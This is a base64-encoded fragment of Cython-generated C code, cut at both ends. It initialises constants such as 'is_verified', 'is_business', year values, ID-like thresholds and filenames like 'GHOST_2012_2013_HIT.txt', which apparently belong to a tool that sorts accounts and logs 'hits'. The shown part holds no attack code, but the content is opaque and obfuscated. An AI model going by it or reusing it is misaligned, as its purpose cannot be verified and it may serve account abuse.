fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEyXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaXNfdmVyaWZpZWQsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSkpIF9fUFlYX0VSUigwLCAyNDAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX2J1c2luZXNzLCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0pKSBfX1BZWF9FUlIoMCwgMjQxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR0hPU1RfMjAxMl8yMDEzX0hJVF90eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0pKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE1XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGxfdHh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdKSkgX19QWVhfRVJSKDAsIDI5MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdID0gUHlTbGljZV9OZXcoUHlfTm9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2LCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85OTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSkpIF9fUFlYX0VSUigwLCA0MDIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0pKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMThdKTtcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMzAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOV0pKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE5XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldKTtcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0pKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0pO1xuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzExMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIyXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIzXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW1wb3J0bGliLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXRpbCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjNdKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjNdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyM10pO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AudHlwZSA9IChQeU9iamVjdCopJlB5RGljdF9UeXBlO1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLm1ldGhvZF9uYW1lID0gJl9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BvcDtcbiAgaWYgKF9fUHl4X0luaXRTdHJpbmdzKF9fcHl4X3N0cmluZ190YWIsIF9fcHl4X21zdGF0ZS0+X19weXhfc3RyaW5nX3RhYiwgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3MpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCA9IFB5TG9uZ19Gcm9tTG9uZygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8wKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xID0gUHlMb25nX0Zyb21Mb25nKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIgPSBQeUxvbmdfRnJvbUxvbmcoMik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMyA9IFB5TG9uZ19Gcm9tTG9uZygzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81ID0gUHlMb25nX0Zyb21Mb25nKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzYgPSBQeUxvbmdfRnJvbUxvbmcoNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOSA9IFB5TG9uZ19Gcm9tTG9uZyg5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMCA9IFB5TG9uZ19Gcm9tTG9uZygxMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzExID0gUHlMb25nX0Zyb21Mb25nKDExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTUgPSBQeUxvbmdfRnJvbUxvbmcoMTUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNiA9IFB5TG9uZ19Gcm9tTG9uZygxNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMwID0gUHlMb25nX0Zyb21Mb25nKDMwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwID0gUHlMb25nX0Zyb21Mb25nKDEwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMTEgPSBQeUxvbmdfRnJvbUxvbmcoMTExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMTEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1MCA9IFB5TG9uZ19Gcm9tTG9uZygxNTApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1MCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAwID0gUHlMb25nX0Zyb21Mb25nKDIwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDggPSBQeUxvbmdfRnJvbUxvbmcoMjA4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDgpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50Xzk5OSA9IFB5TG9uZ19Gcm9tTG9uZyg5OTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50Xzk5OSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxMDAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMzAwID0gUHlMb25nX0Zyb21Mb25nKDEzMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEzMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMjAwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMCA9IFB5TG9uZ19Gcm9tTG9uZygyMDEwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDExID0gUHlMb25nX0Zyb21Mb25nKDIwMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTIgPSBQeUxvbmdfRnJvbUxvbmcoMjAxMik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMyA9IFB5TG9uZ19Gcm9tTG9uZygyMDEzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE0ID0gUHlMb25nX0Zyb21Mb25nKDIwMTQpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTQpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTUgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNiA9IFB5TG9uZ19Gcm9tTG9uZygyMDE2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE3ID0gUHlMb25nX0Zyb21Mb25nKDIwMTcpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTggPSBQeUxvbmdfRnJvbUxvbmcoMjAxOCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOSA9IFB5TG9uZ19Gcm9tTG9uZygyMDE5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwID0gUHlMb25nX0Zyb21Mb25nKDEwMDAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwID0gUHlMb25nX0Zyb21Mb25nKDEyNzkwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxID0gUHlMb25nX0Zyb21Mb25nKDEyNzkwMDFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxNzc1MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSA9IFB5TG9uZ19Gcm9tTG9uZygxNzc1MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMjc5NzYwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEgPSBQeUxvbmdfRnJvbUxvbmcoMjc5NzYwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoOTAwOTkwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDEgPSBQeUxvbmdfRnJvbUxvbmcoOTAwOTkwMDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwID0gUHlMb25nX0Zyb21Mb25nKDE2MjkwMTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNjI5MDEwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xOTAwMDAwMDAwID0gUHlMb25nX0Zyb21Mb25nKDE5MDAwMDAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xOTAwMDAwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNTAwMDAwMDAwID0gUHlMb25nX0Zyb21TdHJpbmcoIjI1MDAwMDAwMDAiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yNTAwMDAwMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2ID0gUHlMb25nX0Zyb21TdHJpbmcoIjM3MTM2Njg3ODYiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zNzEzNjY4Nzg2KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81Njk5Nzg1MjE3ID0gUHlMb25nX0Zyb21TdHJpbmcoIjU2OTk3ODUyMTciLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81Njk5Nzg1MjE3KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF84NTA3OTQwNjM0ID0gUHlMb25nX0Zyb21TdHJpbmcoIjg1MDc5NDA2MzQiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF84NTA3OTQwNjM0KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyMTI1NDAyOTgzNCIsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIxMjU0MDI5ODM0KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICByZXR1cm4gMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICByZXR1cm4gLTE7XG59XG5cbnR5cGVkZWYgc3RydWN0IHtcbiAgICB1bnNpZ25lZCBpbnQgYXJnY291bnQgOiAyO1xuICAgIHVuc2lnbmVkIGludCBudW1fcG9zb25seV9hcmdzIDogMTtcbiAgICB1bnNpZ25lZCBpbnQgbnVtX2t3b25seV9hcmdzIDogMTtcbiAgICB1bnNpZ25lZCBpbnQgbmxvY2FscyA6IDU7XG4gICAgdW5zaWduZWQgaW50IGZsYWdzIDogMTA7XG4gICAgdW5zaWduZWQgaW50IGZpcnN0X2xpbmUgOiA5O1xuICAgIHVuc2lnbmVkIGludCBsaW5lX3RhYmxlX2xlbmd0aCA6IDE0O1xufSBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uO1xuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5Q29kZV9OZXcoXG4gICAgICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IsXG4gICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLFxuICAgICAgICBQeU9iamVjdCAqZmlsZW5hbWUsXG4gICAgICAgIFB5T2JqZWN0ICpmdW5jbmFtZSxcbiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSxcbiAgICAgICAgUHlPYmplY3QgKnR1cGxlX2RlZHVwX21hcFxuKTtcblxuXG5zdGF0aWMgaW50IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF